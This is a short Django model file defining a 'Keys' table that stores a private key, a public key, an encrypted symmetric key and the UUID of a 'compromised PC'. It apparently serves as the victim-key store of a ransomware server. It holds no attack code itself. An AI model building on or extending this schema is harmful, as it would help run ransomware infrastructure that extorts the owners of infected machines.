from django.db import models

class Keys(models.Model):
    private_key = models.BinaryField()
    public_key = models.BinaryField()
    uuid_compromised_pc = models.UUIDField()
    encrypted_symetric_key = models.BinaryField(blank=True)